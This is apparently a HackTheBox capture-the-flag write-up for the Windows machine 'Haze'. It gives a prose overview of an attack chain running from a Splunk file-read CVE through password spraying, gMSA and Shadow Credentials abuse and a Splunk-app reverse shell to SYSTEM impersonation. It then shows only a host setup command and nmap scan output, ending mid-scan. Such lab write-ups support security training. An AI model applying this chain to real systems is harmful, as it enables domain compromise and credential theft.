---
render_with_liquid: false
title: HackTheBox Writeup - Haze
date: 2025-07-05 21:03:45 +1400
tags: [hackthebox, nmap, windows, ad, adcs, netexec, splunk, feroxbuster, directory-traversal, cve-2024-36991, discover-secrets, splunksecrets, password-spraying, ffuf, username-anarchy, user-enumeration, kerbrute, bloodhound-ce, bloodhound-ce-python, bloodhound-cli, ldeep, rid-bruteforce, impacket, kerberos, evil-winrm, discover-backup, bloodyad, dacl-abuse, ad-gmsa, sddl, sddl-maker, shadow-credentials, splunk2rce, splunk-app, privilege-token, potato-attacks, sigma-potato, ntds]
image:
    path: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e8282ac-4fa6-4090-9fb8-9dd15806008e.png
    width: 640
    height: 480
---



Haze is a hard difficulty Windows machine focused on web exploitation, domain abuse, and Windows privilege escalation. Initial access is gained by exploiting a `Splunk Arbitrary File Read (CVE-2024-36991)` to extract an LDAP bind password, which is then decrypted using `splunk.secret`. With valid credentials, a BloodHound scan reveals further accounts, and password spraying provides access to a user with `GMSA` management rights. This allows abuse of the `PrincipalsAllowedToRetrieveManagedPassword` property to dump hashes and pivot into a privileged service account. Using Shadow Credentials, access is escalated to another user. Backup files expose more credentials, eventually giving admin access to `Splunk`. Finally, a custom app upload enables a reverse shell, and `SeImpersonatePrivilege` is abused to impersonate SYSTEM, completing the escalation chain.

# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ pt init '10.10.11.61 DC01.haze.htb haze.htb DC01'
+---------+--------+-------------+---------------+
| PROFILE | STATUS |     IP      |    DOMAIN     |
+---------+--------+-------------+---------------+
| haze    | on     | 10.10.11.61 | DC01.haze.htb |
| haze    | on     | 10.10.11.61 | haze.htb      |
| haze    | on     | 10.10.11.61 | DC01          |
+---------+--------+-------------+---------------+

╒═══════════╤═════════════╤═══════════════╤══════════╤═════════════╤═══════════╤═══════════════╕
│ profile   │ lhost       │ rhost         │ domain   │ ip          │ dc_name   │ dc_fqdn       │
╞═══════════╪═════════════╪═══════════════╪══════════╪═════════════╪═══════════╪═══════════════╡
│ haze      │ 10.10.14.66 │ DC01.haze.htb │ haze.htb │ 10.10.11.61 │ DC01      │ DC01.haze.htb │
╘═══════════╧═════════════╧═══════════════╧══════════╧═════════════╧═══════════╧═══════════════╛
```


## Nmap

```bash
# Nmap 7.95 scan initiated Sat Jul  5 21:03:44 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,8000,8088,8089,9389,47001,49664,49665,49666,49667,49668,54347,56094,56096,56098,56113,56124,56142,56207, 10.10.11.61
Nmap scan report for 10.10.11.61
Host is up, received user-set (0.084s latency).
Scanned at 2025-07-05 21:03:45 CST for 134s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-05 20:41:05Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http          syn-ack ttl 127 Splunkd httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Splunkd
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F
8088/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/localityName=San Francisco/emailAddress=support@splunk.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:29:08
| Not valid after:  2028-03-04T07:29:08
| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
| SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQCtNoIdTvT1CjANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0yNTAzMDUwNzI5MDhaFw0yODAzMDQwNzI5
| MDhaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3SOu
| w9/K07cQT0p+ga9FjWCzI0Os/MVwpjOlPQ/o1uA/VSoNiweXobD3VBLngqfGQlAD
| VGRWkGdD3xS9mOknh9r4Dut6zDyUdKvgrZJVoX7EiRsHhXAr9HRgqWj7khQLz3n9
| fjxxdJkXtGZaNdonWENSeb93HfiYGjSWQJMfNdTd2lMGMDMC4JdydEyGEHRAMNnZ
| y/zCOSP97yJOSSBbr6IZxyZG934bbEH9d9r0g/I4roDlzZFFBlGi542s+1QJ79FR
| IUrfZh41PfxrElITkFyKCJyU5gfPKIvxwDHclE+zY/ju2lcHJMtgWNvF6s0S9ic5
| oxg0+Ry3qngtwd4yUQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQCbT8LwPCoR7I41
| dS2ZjVjntxWHf/lv3MgumorerPBufJA4nw5Yq1gnAYruIkAkfGS7Dy09NL2+SwFy
| NKZa41K6OWst/sRP9smtpY3dfeNu5ofTP5oLEbW2fIEuG4fGvkQJ0SQOPOG71tfm
| ymVCjLlMYMU11GPjfb3CpVh5uLRhIw4btQ8Kz9aB6MiBomyiD/MqtQgA25thnijA
| gHYEzB3W6FKtWtjmPcqDugGs2WU6UID/fFZpsp+3h2QLGN5e+e1OTjoIbexbJ/S6
| iRjTy6GUjsrHtHM+KBjUFvUvHi27Ns47BkNzA1gedvRYrviscPCBkphjo9x0qDdj
| 3EhgaH2L
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET POST HEAD OPTIONS
|_http-title: 404 Not Found
| http-robots.txt: 1 disallowed entry 
|_/
8089/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/localityName=San Francisco/emailAddress=support@splunk.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:29:08
| Not valid after:  2028-03-04T07:29:08
| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
| SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQCtNoIdTvT1CjANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0yNTAzMDUwNzI5MDhaFw0yODAzMDQwNzI5
| MDhaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3SOu
| w9/K07cQT0p+ga9FjWCzI0Os/MVwpjOlPQ/o1uA/VSoNiweXobD3VBLngqfGQlAD
| VGRWkGdD3xS9mOknh9r4Dut6zDyUdKvgrZJVoX7EiRsHhXAr9HRgqWj7khQLz3n9
| fjxxdJkXtGZaNdonWENSeb93HfiYGjSWQJMfNdTd2lMGMDMC4JdydEyGEHRAMNnZ
| y/zCOSP97yJOSSBbr6IZxyZG934bbEH9d9r0g/I4roDlzZFFBlGi542s+1QJ79FR
| IUrfZh41PfxrElITkFyKCJyU5gfPKIvxwDHclE+zY/ju2lcHJMtgWNvF6s0S9ic5
| oxg0+Ry3qngtwd4yUQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQCbT8LwPCoR7I41
| dS2ZjVjntxWHf/lv3MgumorerPBufJA4nw5Yq1gnAYruIkAkfGS7Dy09NL2+SwFy
| NKZa41K6OWst/sRP9smtpY3dfeNu5ofTP5oLEbW2fIEuG4fGvkQJ0SQOPOG71tfm
| ymVCjLlMYMU11GPjfb3CpVh5uLRhIw4btQ8Kz9aB6MiBomyiD/MqtQgA25thnijA
| gHYEzB3W6FKtWtjmPcqDugGs2WU6UID/fFZpsp+3h2QLGN5e+e1OTjoIbexbJ/S6
| iRjTy6GUjsrHtHM+KBjUFvUvHi27Ns47BkNzA1gedvRYrviscPCBkphjo9x0qDdj
| 3EhgaH2L
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
54347/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56094/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
56096/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56098/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56113/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56124/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
